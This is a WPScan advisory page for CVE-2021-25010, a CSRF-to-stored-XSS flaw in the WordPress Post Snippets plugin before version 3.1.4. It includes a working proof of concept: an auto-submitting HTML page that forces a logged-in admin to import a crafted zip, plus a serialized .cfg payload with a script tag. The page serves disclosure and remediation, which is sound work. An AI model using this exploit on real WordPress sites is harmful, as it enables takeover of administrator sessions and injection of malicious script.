=== Content from wpscan.com_42f60770_20250114_222850.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Post Snippets < 3.1.4 - CSRF to Stored Cross-Site Scripting

### Description

The plugin does not have CSRF check when importing files, allowing attacker to make a logged In admin import arbitrary snippets. Furthermore, imported snippers are not sanitised and escaped, which could lead to Stored Cross-Site Scripting issues

### Proof of Concept

<html>
<body onload="submitRequest()">
<script>
function submitRequest()
{
var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/example.com\/wp-admin\/admin.php?page=post-snippets&tab=tools", true);
xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,\*\/\*;q=0.8");
xhr.setRequestHeader("Accept-Language", "en-GB,en;q=0.5");
xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------20968233828580032131818997748");
xhr.withCredentials = true;
var body = "-----------------------------20968233828580032131818997748\r\n" +
"Content-Disposition: form-data; name=\"postsnippets\_import\_file\"; filename=\"post-snippets-export.cfg.zip\"\r\n" +
"Content-Type: application/zip\r\n" +
"\r\n" +
"PK\x03\x04\x14\x00\x08\x00\x08\x00\xbcv{S\x00\x00\x00\x00\x00\x00\x00\x00\xbc\x00\x00\x00\x18\x00 \x00post-snippets-export.cfgUT\r\x00\x07u8\xa2au8\xa2au8\xa2aux\x0b\x00\x01\x04\xf5\x01\x00\x00\x04\x14\x00\x00\x00M\x8d\xcd\x0e\x820\x10\x84\xef\x3e\xc6\x9e\xf4T\xeaO\x88\x03\xf1%\xb8x\xad\xd0\x84&\x84n\xdaE\x8d\x84w\xb7\x8dJ\x3c\xed\xee\xec73\x06\x1a\xb3CQ\x19\x94\x98#N q2X\xaa\"\xf6gP\x1d\xdb\xe0X.f\xb0A\xb6\xea\xda4jW\xab\xaf\x98\xa1#\xe8nB\xcck\x01\xcaCkPg?\x88\xf3\xe3\xdf\'\xe5\xc5\xde\x07i}\x97\n" +
"n\xa95\xe2\x00\xe2\x9e\x7fW\xf6\x3eX\xecS\xa6\xe0^+T&\xe3\xe8\x98\xad\xaci\xcb\xb2y\x03PK\x07\x08\xc7\x1f\xf9,\x87\x00\x00\x00\xbc\x00\x00\x00PK\x03\x04\x14\x00\x08\x00\x08\x00\xbcv{S\x00\x00\x00\x00\x00\x00\x00\x009\x01\x00\x00#\x00 \x00\_\_MACOSX/.\_post-snippets-export.cfgUT\r\x00\x07u8\xa2au8\xa2a\x9a8\xa2aux\x0b\x00\x01\x04\xf5\x01\x00\x00\x04\x14\x00\x00\x00c`\x15cg`b`\xf0MLV\xf0\x0fV\x88P\x80\x02\x90\x18\x03\'\x10\x1b100\xb2\x03i \x9f\xd1\x92\x81(\xe0\x18\x12\x12\x04a\x81ul\x01\xe2V4%LPq\x0f\x06\x06\xfe\xe4\xfc\\\xbd\xc4\x82\x82\x9cT\xbd\xdc\xc4\xe4\x1c\x88\xfc\x1f \xb6e`\x10E\xc8\x15\x96&\x16%\xe6\x95d\xe6\xa5203\xf8\xfdv\xb52\xcdtfi\xae? \xc0\xae\x1c\xddH\x9c\xbb\xd0A\xa1\xbe\x81\x81\x85\xa1\xb5\x99a\xa2\x91\xb1\x85\xa9\x81\xb5[fQjZ~\x85\xb5\xb1\x99\xb9\xa1\x89\x89\xab\xa1\xae\x85\xa5\x81\x8b.\x90a\xa6\xebd\xeah\xackb\xeehj\xe2fi\xe8l\xea\xe2\xca\x00\x00PK\x07\x08\xcfh\xf8:\xb1\x00\x00\x009\x01\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00\xbcv{S\xc7\x1f\xf9,\x87\x00\x00\x00\xbc\x00\x00\x00\x18\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00post-snippets-export.cfgUT\r\x00\x07u8\xa2au8\xa2au8\xa2aux\x0b\x00\x01\x04\xf5\x01\x00\x00\x04\x14\x00\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00\xbcv{S\xcfh\xf8:\xb1\x00\x00\x009\x01\x00\x00#\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\xed\x00\x00\x00\_\_MACOSX/.\_post-snippets-export.cfgUT\r\x00\x07u8\xa2au8\xa2a\x9a8\xa2aux\x0b\x00\x01\x04\xf5\x01\x00\x00\x04\x14\x00\x00\x00PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xd7\x00\x00\x00\x0f\x02\x00\x00\x00\x00\r\n" +
"-----------------------------20968233828580032131818997748\r\n" +
"Content-Disposition: form-data; name=\"action\"\r\n" +
"\r\n" +
"wp\_handle\_upload\r\n" +
"-----------------------------20968233828580032131818997748--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
}
</script>
</body>
</html>
The XSS will be triggered anywhere in the backend
Or, as admin:
Create a .cfg file with the following content: a:1:{i:0;a:7:{s:5:"title";s:29:"<script>alert(/XSS/)</script>";s:4:"vars";s:0:"";s:11:"description";s:0:"";s:9:"shortcode";b:0;s:3:"php";b:0;s:11:"wptexturize";b:0;s:7:"snippet";s:0:"";}}
Zip it and import it via the plugin's Import feature

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

post-snippets](https://a8cteam5105.wordpress.com/plugin/post-snippets/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.1.4

### References

CVE
[CVE-2021-25010](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25010)

### Classification

Type
CSRF

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-352](https://cwe.mitre.org/data/definitions/352.html)

CVSS
[8.8 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Muhammad Adel

Submitter website
<https://itsfading.github.io/>

Submitter twitter
[ItsFadinG\_](//twitter.com/ItsFadinG_)

Verified
Yes

WPVDB ID
[d1ebd15a-72ab-4ba2-a212-7e2eea0b0fb0](https://a8cteam5105.wordpress.com/vulnerability/d1ebd15a-72ab-4ba2-a212-7e2eea0b0fb0/)

### Timeline

Publicly Published
2022-01-31 (about 2 years ago)

Added
2022-01-31 (about 2 years ago)

Last Updated
2022-04-12 (about 2 years ago)

### Other

Published
Title

Published
2022-09-29
Title
[AdminPad < 2.2 - Note Update via CSRF](https://a8cteam5105.wordpress.com/vulnerability/cf0b3893-3283-46d6-a497-f3110a35d42a/)

Published
2023-03-16
Title
[Bulk Resize Media <= 1.1 - CSRF](https://a8cteam5105.wordpress.com/vulnerability/d02f8641-0ffc-4d0e-abaa-655bc1fcb50c/)

Published
2024-05-09
Title
[Church Admin < 4.2.0 - Cross-Site Request Forgery](https://a8cteam5105.wordpress.com/vulnerability/0bc6fd3f-6a26-49e0-931e-fb93cbe05d3c/)

Published
2023-11-07
Title
[ANAC XML Bandi di Gara <= 7.5 - Cross-Site Request Forgery via settings.php](https://a8cteam5105.wordpress.com/vulnerability/0317a5c2-c531-48e5-a83a-d31373e14949/)

Published
2022-05-18
Title
[Latest Tweets Widget <= 1.1.4 - Arbitrary Settings Update via CSRF](https://a8cteam5105.wordpress.com/vulnerability/06e547fd-cddf-4294-87be-54f58d6138a7/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

